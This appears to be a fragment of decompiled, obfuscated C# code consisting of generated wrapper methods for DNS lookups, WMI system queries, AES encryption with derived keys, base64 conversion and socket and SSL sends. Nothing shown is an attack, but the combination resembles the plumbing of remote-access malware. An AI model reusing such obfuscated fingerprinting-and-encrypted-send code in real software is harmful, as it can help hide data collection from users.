		return MessageBox.Show(string_7, string_8, messageBoxButtons_0, messageBoxIcon_0);
	}

	static string smethod_168()
	{
		return Dns.GetHostName();
	}

	static IPHostEntry smethod_169(string string_7)
	{
		return Dns.GetHostEntry(string_7);
	}

	static IPAddress[] smethod_170(IPHostEntry iphostEntry_0)
	{
		return iphostEntry_0.AddressList;
	}

	static AddressFamily smethod_171(IPAddress ipaddress_0)
	{
		return ipaddress_0.AddressFamily;
	}

	static ManagementObjectSearcher smethod_172(string string_7, string string_8)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Expected O, but got Unknown
		return new ManagementObjectSearcher(string_7, string_8);
	}

	static ManagementObjectCollection smethod_173(ManagementObjectSearcher managementObjectSearcher_0)
	{
		return managementObjectSearcher_0.Get();
	}

	static ManagementObjectEnumerator smethod_174(ManagementObjectCollection managementObjectCollection_0)
	{
		return managementObjectCollection_0.GetEnumerator();
	}

	static ManagementBaseObject smethod_175(ManagementObjectEnumerator managementObjectEnumerator_0)
	{
		return managementObjectEnumerator_0.get_Current();
	}

	static object smethod_176(ManagementBaseObject managementBaseObject_0, string string_7)
	{
		return managementBaseObject_0.GetPropertyValue(string_7);
	}

	static bool smethod_177(ManagementObjectEnumerator managementObjectEnumerator_0)
	{
		return managementObjectEnumerator_0.MoveNext();
	}

	static Aes smethod_178()
	{
		return Aes.Create();
	}

	static void smethod_179(Array array_0, RuntimeFieldHandle runtimeFieldHandle_0)
	{
		RuntimeHelpers.InitializeArray(array_0, runtimeFieldHandle_0);
	}

	static Rfc2898DeriveBytes smethod_180(string string_7, byte[] byte_1)
	{
		return new Rfc2898DeriveBytes(string_7, byte_1);
	}

	static byte[] smethod_181(DeriveBytes deriveBytes_0, int int_7)
	{
		return deriveBytes_0.GetBytes(int_7);
	}

	static void smethod_182(SymmetricAlgorithm symmetricAlgorithm_0, byte[] byte_1)
	{
		symmetricAlgorithm_0.Key = byte_1;
	}

	static void smethod_183(SymmetricAlgorithm symmetricAlgorithm_0, byte[] byte_1)
	{
		symmetricAlgorithm_0.IV = byte_1;
	}

	static MemoryStream smethod_184()
	{
		return new MemoryStream();
	}

	static ICryptoTransform smethod_185(SymmetricAlgorithm symmetricAlgorithm_0)
	{
		return symmetricAlgorithm_0.CreateEncryptor();
	}

	static CryptoStream smethod_186(Stream stream_0, ICryptoTransform icryptoTransform_0, CryptoStreamMode cryptoStreamMode_0)
	{
		return new CryptoStream(stream_0, icryptoTransform_0, cryptoStreamMode_0);
	}

	static void smethod_187(Stream stream_0)
	{
		stream_0.Close();
	}

	static byte[] smethod_188(MemoryStream memoryStream_0)
	{
		return memoryStream_0.ToArray();
	}

	static string smethod_189(byte[] byte_1)
	{
		return Convert.ToBase64String(byte_1);
	}

	static byte[] smethod_190(string string_7)
	{
		return Convert.FromBase64String(string_7);
	}

	static ICryptoTransform smethod_191(SymmetricAlgorithm symmetricAlgorithm_0)
	{
		return symmetricAlgorithm_0.CreateDecryptor();
	}

	static int smethod_192(Socket socket_1, byte[] byte_1)
	{
		return socket_1.Send(byte_1);
	}

	static void smethod_193(SslStream sslStream_1, byte[] byte_1)
	{
		sslStream_1.Write(byte_1);
	}
}
